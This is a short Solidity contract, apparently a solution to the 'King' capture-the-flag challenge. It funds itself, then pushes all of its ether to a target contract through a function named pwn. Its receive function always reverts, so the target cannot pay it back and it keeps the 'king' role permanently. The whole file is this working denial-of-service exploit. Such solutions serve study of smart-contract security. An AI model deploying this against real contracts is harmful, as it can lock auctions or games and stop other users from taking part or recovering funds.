// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingSolver {

    uint256 fund;

    function deposite() public payable {
        fund += msg.value;
    }

    function pwn(address payable _king) public {
        (bool sent,) = _king.call{value: fund}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {
        revert("I'm a forever king.");
    }
}